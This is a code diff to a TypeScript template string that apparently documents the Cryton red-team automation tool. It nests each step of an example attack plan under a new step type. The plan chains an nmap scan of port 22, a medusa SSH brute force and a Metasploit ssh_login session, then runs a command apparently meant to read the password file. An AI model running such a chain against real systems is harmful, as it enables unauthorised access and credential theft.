@@ -27,22 +27,26 @@ export const advancedTemplateDescription = `plan:
         seconds: 5
       steps:
         - name: scan-localhost
-          attack_module: mod_nmap
-          attack_module_args:
-            target: "{{ target }}"
-            ports:
-              - 22
+          step_type: cryton/execute-on-worker
+          arguments:
+            attack_module: mod_nmap
+            attack_module_args:
+              target: "{{ target }}"
+              ports:
+                - 22
           is_init: true
           next:
             - step: bruteforce
               type: result
               value: OK
         - name: bruteforce
-          attack_module: mod_medusa
-          attack_module_args:
-            target: "{{ target }}"
-            credentials:
-              username: "{{ username }}"
+          step_type: cryton/execute-on-worker
+          arguments:
+            attack_module: mod_medusa
+            attack_module_args:
+              target: "{{ target }}"
+              credentials:
+                username: "{{ username }}"
     - name: stage-two
       trigger_type: HTTPListener
       trigger_args:
@@ -56,24 +60,28 @@ export const advancedTemplateDescription = `plan:
                 value: "1"
       steps:
         - name: ssh-session
-          attack_module: mod_msf
-          attack_module_args:
-            create_named_session: session_to_target_1
-            exploit: auxiliary/scanner/ssh/ssh_login
-            exploit_arguments:
-              RHOSTS: "{{ target }}"
-              USERNAME: $bruteforce.username
-              PASSWORD: $bruteforce.password
+          step_type: cryton/execute-on-worker
+          arguments:
+            attack_module: mod_msf
+            attack_module_args:
+              create_named_session: session_to_target_1
+              exploit: auxiliary/scanner/ssh/ssh_login
+              exploit_arguments:
+                RHOSTS: "{{ target }}"
+                USERNAME: $bruteforce.username
+                PASSWORD: $bruteforce.password
           is_init: true
           next:
             - step: session-cmd
               type: result
               value: OK
         - name: session-cmd
-          attack_module: mod_cmd
-          attack_module_args:
-            use_named_session: session_to_target_1
-            cmd: "{{ commands.passwd }}"
+          step_type: cryton/execute-on-worker
+          arguments:
+            attack_module: mod_cmd
+            attack_module_args:
+              use_named_session: session_to_target_1
+              cmd: "{{ commands.passwd }}"
       depends_on:
         - stage-one
 `;
